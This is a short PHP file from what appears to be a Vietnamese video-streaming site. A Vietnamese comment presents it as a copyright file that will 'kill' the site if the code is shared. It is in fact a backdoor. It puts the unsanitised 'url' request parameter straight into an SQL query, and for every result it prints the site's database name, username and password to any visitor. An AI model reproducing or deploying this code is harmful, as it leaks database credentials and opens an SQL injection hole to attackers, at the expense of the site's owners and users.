<?php
define('RK_MEDIA',true);
# FILE BẢN QUYỀN. NẾU CODE BỊ SHARE THÌ FILE NÀY SẼ LÀ FILE KILL WEBSITE CỦA BẠN. #
$t= $_SERVER['DOCUMENT_ROOT'];
require_once $t.'/init.php';
$url = $_GET['url'];
$checker = MySql::dbselect('id,name,url', 'episode', "filmid =$url");
for($i=0;$i<count($checker);$i++) {
$name = $checker[$i][1];
$tap = $checker[$i][2];
echo $all = $name . '|' . $tap ."<br>";
echo 'DATA: '.DATABASE_NAME."<br>";
echo 'USER: '.DATABASE_USER."<br>";
echo 'PASS: '.DATABASE_PASS."<br>";
}